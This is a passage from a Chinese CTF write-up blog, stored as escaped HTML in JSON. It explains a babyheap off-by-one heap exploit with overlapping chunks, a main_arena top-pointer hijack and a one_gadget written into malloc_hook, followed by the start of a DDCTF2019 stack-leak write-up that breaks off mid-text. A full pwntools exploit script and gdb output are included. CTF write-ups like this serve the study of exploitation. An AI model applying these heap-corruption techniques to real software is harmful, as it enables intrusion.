class=\"function\">fastcall <span class=\"title\">update</span><span class=\"params\">(element *<span class=\"built_in\">list</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 oldSizePlus1; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> newsize; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index: \"</span>);</span><br><span class=\"line\">  i = getlong();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i &gt;= <span class=\"number\">0</span> &amp;&amp; i &lt;= <span class=\"number\">15</span> &amp;&amp; <span class=\"built_in\">list</span>[i].inuse == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Size: \"</span>);</span><br><span class=\"line\">    LODWORD(oldSizePlus1) = getlong();</span><br><span class=\"line\">    newsize = oldSizePlus1;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)oldSizePlus1 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      oldSizePlus1 = <span class=\"built_in\">list</span>[i].size + <span class=\"number\">1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( newsize &lt;= oldSizePlus1 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content: \"</span>);</span><br><span class=\"line\">        readN((<span class=\"keyword\">char</span> *)<span class=\"built_in\">list</span>[i].chunkptr, newsize);<span class=\"comment\">// off by one</span></span><br><span class=\"line\">        LODWORD(oldSizePlus1) = <span class=\"built_in\">printf</span>(<span class=\"string\">\"Chunk %d Updated\\n\"</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)i);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(oldSizePlus1) = <span class=\"built_in\">puts</span>(<span class=\"string\">\"Invalid Index\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> oldSizePlus1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h4><p>free掉对应chunk，并将数组上相应位置设置为NULL，不存在UAF。</p>\n<h4 id=\"view\"><a href=\"#view\" class=\"headerlink\" title=\"view\"></a>view</h4><p>根据inuse，show出chunk的内容。</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>本题应该是构造overlapping，以实现信息泄漏和fastbin attack。</p>\n<h4 id=\"leak-libc-1\"><a href=\"#leak-libc-1\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>溢出一个小chunk，改大下一个chunk的size位，然后free掉被修改的chunk，这时chunk将会被放到unsorted bin中，之后再malloc较小的size，即可从被分离后的last remainder处leak处main_arena地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload = <span class=\"number\">0x18</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\xa1\"</span></span><br><span class=\"line\">update(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">view(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = addr - <span class=\"number\">0x3c4b78</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"劫持控制流\"><a href=\"#劫持控制流\" class=\"headerlink\" title=\"劫持控制流\"></a>劫持控制流</h4><p>按常规思路，我们只要能将chunk申请到malloc_hook之前的那个位置（即保证size为0x7f），然后修改malloc_hook为one_gadget即可，但是本题对申请的chunk的size进行限制，最大只能为0x60，所以不可能通过直接的fastbin attack修改fd从而申请到那个位置。这里，我们采用改main_arena中的top指针的方法，令下次分配从top指针指向的地址开始。</p>\n<p>main_arena的结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">/* Serialize access.  */</span></span><br><span class=\"line\">    __libc_lock_define(, mutex);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Flags (formerly in max_fast).  */</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> flags;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Fastbins */</span></span><br><span class=\"line\">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class=\"line\">    mchunkptr top; <span class=\"comment\">// top chunk的地址</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* The remainder from the most recent split of a small request */</span></span><br><span class=\"line\">    mchunkptr last_remainder;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Normal bins packed as described above */</span></span><br><span class=\"line\">    mchunkptr bins[ NBINS * <span class=\"number\">2</span> - <span class=\"number\">2</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> binmap[ BINMAPSIZE ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Linked list, points to the next arena */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class=\"line\"><span class=\"comment\">       by free_list_lock in arena.c.  */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next_free</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class=\"line\"><span class=\"comment\">       the free list.  Access to this field is serialized by</span></span><br><span class=\"line\"><span class=\"comment\">       free_list_lock in arena.c.  */</span></span><br><span class=\"line\">    INTERNAL_SIZE_T attached_threads;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Memory allocated from the system in this arena.  */</span></span><br><span class=\"line\">    INTERNAL_SIZE_T system_mem;</span><br><span class=\"line\">    INTERNAL_SIZE_T max_system_mem;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>gdb调试：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x7f81fbc89b20</span><br><span class=\"line\">0x7f81fbc89b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000559b443720e0</span><br><span class=\"line\">0x7f81fbc89b80 &lt;main_arena+96&gt;:\t0x0000559b44372070\t0x0000559b44372070</span><br><span class=\"line\">0x7f81fbc89b90 &lt;main_arena+112&gt;:\t0x0000559b44372070\t0x00007f81fbc89b88</span><br><span class=\"line\">0x7f81fbc89ba0 &lt;main_arena+128&gt;:\t0x00007f81fbc89b88\t0x00007f81fbc89b98</span><br><span class=\"line\"></span><br><span class=\"line\">gef➤  heap chunks</span><br><span class=\"line\">Chunk(addr=0x559b44372010, size=0x20, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0000559b44372010     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]</span><br><span class=\"line\">Chunk(addr=0x559b44372030, size=0x50, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0000559b44372030     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]</span><br><span class=\"line\">Chunk(addr=0x559b44372080, size=0x50, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0000559b44372080     78 9b c8 fb 81 7f 00 00 78 9b c8 fb 81 7f 00 00    x.......x.......]</span><br><span class=\"line\">Chunk(addr=0x559b443720d0, size=0x20, flags=)</span><br><span class=\"line\">    [0x0000559b443720d0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]</span><br><span class=\"line\">Chunk(addr=0x559b443720f0, size=0x20f20, flags=PREV_INUSE)  ←  top chunk</span><br></pre></td></tr></table></figure>\n<p>所以main_arena + 88处存储的是top chunk的地址，尝试在这个地址前找一个合适的偏移。但是前面都是fastbin数组存储的fd指针，如果fastbin链表中没有chunk的话，就不可能有合适的偏移地址。所以要首先向fastbin 填充一些chunk的地址，这里有个trick，一般来说堆地址是0x55开头的（有时候是0x56），所以我们用fastbin在main_arena占位后，找到一个合适的偏移，使得size为0x55(0x56)，然后malloc(0x40)即可。这里是根据<code>(0x55 &gt;&gt; 4) - 2 =  4</code>计算得到chunk在fastbin中的下标。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x7f4b01358b78-0x58 + 0x20 + 5</span><br><span class=\"line\">0x7f4b01358b45 &lt;main_arena+37&gt;:\t0xad249d50e0000000\t0x0000000000000055</span><br><span class=\"line\">0x7f4b01358b55 &lt;main_arena+53&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f4b01358b65 &lt;main_arena+69&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f4b01358b75 &lt;main_arena+85&gt;:\t0xad249d5140000000\t0xad249d5070000055</span><br><span class=\"line\">0x7f4b01358b85 &lt;main_arena+101&gt;:\t0x4b01358b78000055\t0x4b01358b7800007f</span><br></pre></td></tr></table></figure>\n<p>可以看到，当分配到main_arena+0x20+5时，size为0x55，然后就可以覆盖top chunk或者last remainder了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  heap bins</span><br><span class=\"line\">[+] No Tcache in this version of libc</span><br><span class=\"line\">────────────────────── Fastbins for arena 0x7fedf8a74b20 ──────────────────────</span><br><span class=\"line\">Fastbins[idx=0, size=0x10] 0x00</span><br><span class=\"line\">Fastbins[idx=1, size=0x20] 0x00</span><br><span class=\"line\">Fastbins[idx=2, size=0x30] 0x00</span><br><span class=\"line\">Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x55f94d040080, size=0x50, flags=PREV_INUSE)  ←  Chunk(addr=0x7fedf8a74b55, size=0x50, flags=PREV_INUSE|NON_MAIN_ARENA) </span><br><span class=\"line\">Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x55f94d0400f0, size=0x60, flags=PREV_INUSE) </span><br><span class=\"line\">Fastbins[idx=5, size=0x60] 0x00</span><br><span class=\"line\">Fastbins[idx=6, size=0x70] 0x00</span><br></pre></td></tr></table></figure>\n<p>​    当成功修改top指针后，再次malloc，会从top指针处开始任意分配，这时分配到malloc_hook之前即可，但仍然需要绕过对size的检查，所以我们令top chunk指向main_arena - 0x33的地址。</p>\n<p>​    </p>\n<p>​    但是，该题利用成功率不是百分之百，有一定几率失败。</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./babyheap\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./babyheap\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">allocate</span><span class=\"params\">(size)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Size: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">update</span><span class=\"params\">(index, size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Size: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Content: \"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">view</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x18</span>) <span class=\"comment\"># 0 </span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">payload = <span class=\"number\">0x18</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\xa1\"</span></span><br><span class=\"line\">update(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">view(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = addr - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">main_arena = addr - <span class=\"number\">0x58</span></span><br><span class=\"line\">one_gadget = libc.address + <span class=\"number\">0x4526a</span> <span class=\"comment\"># f1147 4526a</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">chunk_addr = main_arena + <span class=\"number\">0x20</span> + <span class=\"number\">5</span></span><br><span class=\"line\">fake_addr = main_arena - <span class=\"number\">0x33</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>) <span class=\"comment\"># use 4 to write to truly 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">allocate(<span class=\"number\">0x58</span>) <span class=\"comment\"># 2 </span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(chunk_addr) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">update(<span class=\"number\">4</span>,len(payload), payload) <span class=\"comment\"># change fd of truly idx2</span></span><br><span class=\"line\"></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 5 at main_arena</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = (<span class=\"number\">0x58</span> - <span class=\"number\">0x30</span> - <span class=\"number\">5</span>) * <span class=\"string\">\"\\x00\"</span></span><br><span class=\"line\">payload += p64(fake_addr)</span><br><span class=\"line\">update(<span class=\"number\">5</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">allocate(<span class=\"number\">0x48</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\">payload = <span class=\"number\">0x13</span> * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">payload += p64(one_gadget)</span><br><span class=\"line\">update(<span class=\"number\">6</span>, len(payload), payload)</span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考链接：\"><a href=\"#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h1><p><a href=\"https://www.anquanke.com/post/id/175630\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/175630</a></p>\n<p><a href=\"http://eternalsakura13.com/2018/04/03/babyheap/\" target=\"_blank\" rel=\"noopener\">http://eternalsakura13.com/2018/04/03/babyheap/</a></p>\n","text":"本文讲一下近期学习的两种围绕Top Chunk做文章的堆利用方法：House of Force和直接修改main_arena中的top指针。House of force（Top chunk劫持）top chunk的分割机制与利用点众所周知，top chunk的作用是作为后备堆空间","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"}]},{"title":"DDCTF2019-writeup","slug":"DDCTF2019-writeup","date":"2019-04-18T11:41:06.000Z","updated":"2019-04-21T03:09:33.457Z","comments":true,"path":"api/articles/DDCTF2019-writeup.json","excerpt":"","keywords":null,"cover":null,"content":"<p>本次DDCTF2019抱着玩一玩的心态参与了一下，事先不知道Pwn的题目这么少，RE的题目也不算多（主要RE的难题我不会做，简单题又比较水），所以就一开始做了两天，后续没有再尝试，最后排名100多位。下面简单总结一下Pwn和RE几道题的writeup。</p>\n<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><p>pwn只有一道题目</p>\n<h2 id=\"Strike\"><a href=\"#Strike\" class=\"headerlink\" title=\"Strike\"></a>Strike</h2><p>该题目提供了libc，防护如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/DDCTF2019$ checksec xpwn </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/DDCTF2019/xpwn&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>未开启canary和PIE，只开启了NX，且为32位，有栈利用的可能。</p>\n<p>简单运行程序发现程序首先要求输入用户名，然后在打印用户名的时候会出现一些不可见字符，这里可能存在信息泄漏漏洞。之后要求输入密码的长度，再输入密码。用IDA简单查看下：</p>\n<p>在向栈上写name时，由于写完就用格式化字符串的%s格式输出，所以只要不输入\\x00，就可以随意leak出栈上的数据。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">sub_80485DB</span><span class=\"params\">(FILE *stream, FILE *a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+0h] [ebp-48h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Enter username: \"</span>);</span><br><span class=\"line\">  v2 = fileno(stream);</span><br><span class=\"line\">  read(v2, &amp;buf, <span class=\"number\">0x40</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">fprintf</span>(a2, <span class=\"string\">\"Hello %s\"</span>, &amp;buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调试可知，我们从ebp-0x48处开始写，而ebp-0x20处为栈地址，ebp-0x24处为libc地址，所以padding 0x48 - 0x20字节可以直接leak处栈地址和libc地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  dereference $esp 100</span><br><span class=\"line\">0xffffcf00│+0x0000: 0x00000000\t ← $esp</span><br><span class=\"line\">0xffffcf04│+0x0004: 0xffffcf10  →  0xf7ffd000  →  0x00023f40</span><br><span class=\"line\">0xffffcf08│+0x0008: 0x00000040 (&quot;@&quot;?)</span><br><span class=\"line\">0xffffcf0c│+0x000c: 0xffffcf88  →  0xf7e0bdc8  →  0x00002b76 (&quot;v+&quot;?)</span><br><span class=\"line\">0xffffcf10│+0x0010: 0xf7ffd000  →  0x00023f40  &lt;= 从这里开始写</span><br><span class=\"line\">0xffffcf14│+0x0014: 0x080482c8  →   add BYTE PTR [ecx+ebp*2+0x62], ch</span><br><span class=\"line\">0xffffcf18│+0x0018: 0x08048258  →  0x00000057 (&quot;W&quot;?)</span><br><span 